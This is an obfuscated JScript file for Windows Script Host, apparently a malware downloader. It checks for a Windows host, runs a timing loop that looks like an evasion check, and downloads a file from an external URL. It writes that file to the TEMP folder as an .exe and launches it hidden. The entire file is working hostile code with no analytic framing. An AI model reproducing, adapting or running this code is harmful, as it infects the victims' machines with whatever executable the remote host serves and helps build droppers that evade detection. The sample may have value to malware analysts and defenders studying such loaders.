var R = false;
var bz = "CreateObject";
var M0 = function K() {return WScript[bz]("WScript.Shell");}(), zb = 11;
var W = "MSXML2.XMLHTTP";
var S = 2123213;
var dq = 0;
function Xz(nr){M0["Run"](nr, dq, dq);};
function Xi(){return "" + W;};
function a0(tl, b0){dq = dq * 1; return tl - b0;};
function D(){return bz;};
/*@cc_on
  @if (@_win32 || @_win64)
    R = true;
  @end
@*/
if (R)
{
var F = "";
function Pv(){return 22;};
var b = 0; var n = 0;
function h()
{
var lt = new this["Date"]();
var qA = lt["getUTCMilliseconds"]();
WScript["Sleep"](Pv());
var lt = new this["Date"]();
var bG = lt["getUTCMilliseconds"]();
WScript["Sleep"](Pv());
var lt = new this["Date"]();
var sy = lt["getUTCMilliseconds"]();
var b = "TM";
b = a0(bG, qA);
var n = "C";
n = a0(sy, bG);
F = "open";
return a0(b, n);
}
var M = false;
var w = false;
for (var fs = dq; fs < Pv() * 1; fs++){if (h() != dq){
M = true; 
n = "31" + 11 * b + n; 
w = true; 
break;
}}
function y() {return ((M == true) && (M == w)) ? 1 : dq;};
if (M && y() && w){
function a() {return M0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ZDW94i5mW.exe";};
 c = Xi();
 y0 = WScript[bz](c);
 var KR = 1;
 while (KR){
try {
y0[F]("GET", "http://dealingdeuces.com/o4pskd", false);
y0["send"]();
W0 = "Sleep";
for (;;){WScript[W0](Pv() * 11); if (y0["readystate"] >= 2 * 2) break;};
KR = dq;
} catch(U){};
}
function qG(P) {var T = (1, 2, 3, 4, 5, P); return T;};
k = WScript[D()]("ADODB.Stream");
c = k;
c[F]();
c["type"] = qG(1);
c["write"](y0["ResponseBody"]);
k["position"] = qG(dq);
c["Save" + "ToFile"](a(), 2);
k["c"+"lose"]();
wV = a();
Xz(wV);
}
}

